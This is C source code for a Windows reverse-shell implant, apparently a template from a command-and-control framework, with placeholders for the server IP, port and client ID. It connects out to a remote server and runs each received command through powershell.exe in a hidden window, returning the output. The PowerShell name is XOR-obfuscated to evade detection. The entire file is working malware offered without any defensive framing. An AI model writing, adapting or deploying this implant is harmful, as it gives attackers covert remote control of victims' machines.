#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma commment(lib, "ws2_32.lib")

#define SERVER_IP "{{.IP_SERVER}}"
#define SERVER_PORT {{.PORT_SERVER}}
#define CRE_N_WIN 0x08000000
#define TIMEOUT 60
#define TIMEOUT_MS 10000

int xor_decrypt(char* data, size_t len, char key) {
	for (size_t i = 0; i < len && data[i]; i++){
		data[i] ^= key;
	}
	return 0;
}

size_t my_strlen(const char* s){
	size_t i = 0;
	while(s[i]) ++i;
	return i;
}

void execute_command(SOCKET sock, const char* cmdID, const char* command) {
    // char var0[] = {'c' ^ 0xE2, 'm' ^ 0xE2, 'd' ^ 0xE2, '.' ^ 0xE2, 'e' ^ 0xE2, 'x' ^ 0xE2, 'e' ^ 0xE2, '\0'};
    char var0[] = {'p' ^ 0xE2, 'o' ^ 0xE2, 'w' ^ 0xE2, 'e' ^ 0xE2, 'r' ^ 0xE2, 's' ^ 0xE2, 'h' ^ 0xE2, 'e' ^ 0xE2, 'l' ^ 0xE2, 'l' ^ 0xE2, '.' ^ 0xE2, 'e' ^ 0xE2, 'x' ^ 0xE2, 'e' ^ 0xE2, '\0'};
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        char errMsg[512];
        snprintf(errMsg, sizeof(errMsg), "OUT:%s:[!] Pipe creation failed\n", cmdID);
        send(sock, errMsg, strlen(errMsg), 0);
        return;
    }

    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    char cmdLine[1024];
    xor_decrypt(var0, my_strlen(var0), 0xE2);
    
    snprintf(cmdLine, sizeof(cmdLine), "%s /C %s", var0, command);

    BOOL success = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CRE_N_WIN, NULL, NULL, &si, &pi);
    CloseHandle(hWrite);

    if (!success) {
        char errMsg[128];
        snprintf(errMsg, sizeof(errMsg), "OUT:%s:[!] Command launch failed\n", cmdID);
        send(sock, errMsg, strlen(errMsg), 0);
        CloseHandle(hRead);
        return;
    }

    DWORD exitCode = STILL_ACTIVE;
    DWORD startTime = GetTickCount();

    char buffer[512];
    DWORD bytesRead;
    
    while (GetTickCount() - startTime < TIMEOUT_MS) {
        if (PeekNamedPipe(hRead, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0) {
            if (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                buffer[bytesRead] = '\0';

                char* lineStart = buffer;
                char* newline;

                while ((newline = strchr(lineStart, '\n')) != NULL) {
                    *newline = '\0';

                    // ignore empty lines
                    if (strlen(lineStart) > 0 && strspn(lineStart, " \r") != strlen(lineStart)) {
                        char outLine[600];
                        snprintf(outLine, sizeof(outLine), "OUT:%s:%s\n", cmdID, lineStart);
                        send(sock, outLine, strlen(outLine), 0);
                        printf("%s\n", outLine);
                    }

                    lineStart = newline + 1;
                }

                // if remainder (when no newline at end)
                if (strlen(lineStart) > 0 && strspn(lineStart, " \r") != strlen(lineStart)) {
                    char outLine[600];
                    snprintf(outLine, sizeof(outLine), "OUT:%s:%s\n", cmdID, lineStart);
                    send(sock, outLine, strlen(outLine), 0);
                    printf("%s\n", outLine);
                    startTime = GetTickCount(); // Reset timer on activity
                }          
            }
        }

        GetExitCodeProcess(pi.hProcess, &exitCode);
        if (exitCode != STILL_ACTIVE) break;

        Sleep(100);
    }

    if (exitCode == STILL_ACTIVE) {
        TerminateProcess(pi.hProcess, 1);
        char interactMsg[512];
        snprintf(interactMsg, sizeof(interactMsg), "OUT:%s:[!] Command cancelled due to timeout or interactivity\n", cmdID);
        send(sock, interactMsg, strlen(interactMsg), 0);
    }

    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    char endMsg[64];
    snprintf(endMsg, sizeof(endMsg), "END:%s\n", cmdID);
    send(sock, endMsg, strlen(endMsg), 0);
}


int main() {
    // Windows socket init
    WSADATA wsa;
    SOCKET sock;

    struct sockaddr_in server;

    char recvBuf[1024];
    char parseBuf[2048] = {0};
    int parseLen = 0;
    DWORD timeout = TIMEOUT * 1000;

    WSAStartup(MAKEWORD(2, 2), &wsa);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    // Server bind to retrieve info
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    connect(sock, (struct sockaddr*)&server, sizeof(server));

    // ID du client
    char* clientID = "{{.ID}}\n";
    send(sock, clientID, strlen(clientID), 0);

    while (1) {
        int received = recv(sock, recvBuf, sizeof(recvBuf) - 1, 0);
        if (received <= 0) break;

        recvBuf[received] = '\0';
        // Stack in parseBuf
        if (parseLen + received >= sizeof(parseBuf))
            parseLen = 0; // avoid overflow
        memcpy(parseBuf + parseLen, recvBuf, received);
        parseLen += received;
        parseBuf[parseLen] = '\0';

        // Process line by line
        char* lineStart = parseBuf;
        char* newline;
        while ((newline = strchr(lineStart, '\n')) != NULL) {
            *newline = '\0'; // cut line
            if (strncmp(lineStart, "CMD:", 4) == 0) {
                // Format: CMD:<id>:<commande>
                char* cmdID = lineStart + 4;
                char* cmdStr = strchr(cmdID, ':');
                if (cmdStr) {
                    *cmdStr = '\0';
                    cmdStr++;
                    execute_command(sock, cmdID, cmdStr);
                }
            }
            lineStart = newline + 1;
        }

        // shift the remainder at the buffer's start
        parseLen = strlen(lineStart);
        memmove(parseBuf, lineStart, parseLen);
    }

    closesocket(sock);
    WSACleanup();

    return 0;
}